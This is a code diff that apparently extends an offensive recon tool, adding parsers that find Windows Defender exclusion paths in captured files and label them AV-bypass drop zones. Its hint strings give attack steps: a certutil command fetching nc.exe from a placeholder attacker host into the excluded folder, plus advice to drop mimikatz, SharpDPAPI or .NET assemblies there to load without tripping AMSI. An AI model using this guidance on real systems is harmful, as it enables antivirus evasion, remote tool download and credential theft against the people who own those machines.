@@ -8028,6 +8028,63 @@ def _multiline_passes(path, report, store):
                                    meta={"source": "iis_apppool",
                                          "pool": _pool}))
 
+    # iter-291: Windows Defender exclusion path captured. Two shapes:
+    #  (a) Get-MpPreference | Select-Object ExclusionPath   [readout]
+    #  (b) Add-MpPreference -ExclusionPath 'X'              [command]
+    # Any file dropped in an ExclusionPath dir bypasses real-time AV
+    # scanning - the operator's payload drop zone. Also useful defense
+    # intel: reveals what the target admin explicitly trusts.
+    _MPPREF_READ = re.compile(
+        r'(?i)ExclusionPath\s*[:=]\s*\{([^\}]{2,600})\}')
+    _MPPREF_ADD = re.compile(
+        r'(?i)Add-MpPreference\b[^\r\n]*?'
+        r'-ExclusionPath\s+[\'"]?([^\r\n\'";,]{2,240})[\'"]?')
+    if not filters.is_doc_file(path):
+        _mp_seen = set()
+        for _mr in _MPPREF_READ.finditer(text[:65536]):
+            _paths_str = _mr.group(1)
+            # comma-separated list; strip each
+            for _pth in _paths_str.split(","):
+                _pth = _pth.strip().strip('"\'')
+                if not _pth or len(_pth) < 3:
+                    continue
+                if _pth.lower() in _mp_seen:
+                    continue
+                _mp_seen.add(_pth.lower())
+                _pth_sh = _pth.replace("'", "'\\''")
+                report.add("MEDIUM", "RECON", path, _ln(_mr),
+                           f"Defender exclusion path: {_pth} - AV-"
+                           f"bypass drop zone",
+                           hint=(f"drop payloads here to bypass "
+                                 f"real-time scan: certutil -urlcache"
+                                 f" -split -f http://<lhost>/nc.exe "
+                                 f"'{_pth_sh}\\nc.exe'  |  or dump "
+                                 f"mimikatz.exe / SharpDPAPI.exe / "
+                                 f"any .NET assembly for reflective "
+                                 f"load without AMSI trigger"))
+                if store is not None:
+                    store.add(Evidence(kind="defender_exclusion",
+                                       source=path, line=_ln(_mr),
+                                       meta={"path": _pth}))
+        for _ma in _MPPREF_ADD.finditer(text[:65536]):
+            _pth = _ma.group(1).strip().strip('"\'')
+            if not _pth or _pth.lower() in _mp_seen:
+                continue
+            _mp_seen.add(_pth.lower())
+            _pth_sh = _pth.replace("'", "'\\''")
+            report.add("MEDIUM", "RECON", path, _ln(_ma),
+                       f"Defender Add-MpPreference exclusion: {_pth}"
+                       f" - operator/admin just whitelisted this",
+                       hint=(f"drop staged payloads at '{_pth_sh}\\'"
+                             f" - AV won't scan them  |  if this line"
+                             f" was in a captured admin PS transcript,"
+                             f" the admin knowingly opened this hole"))
+            if store is not None:
+                store.add(Evidence(kind="defender_exclusion",
+                                   source=path, line=_ln(_ma),
+                                   meta={"path": _pth,
+                                         "source": "add-mppreference"}))
+
     # iter-279: PowerView `Get-DomainComputer -Unconstrained | fl` output.
     # `TRUSTED_FOR_DELEGATION` in userAccountControl = unconstrained
     # Kerberos delegation. On DCs it's by design (SERVER_TRUST_ACCOUNT)
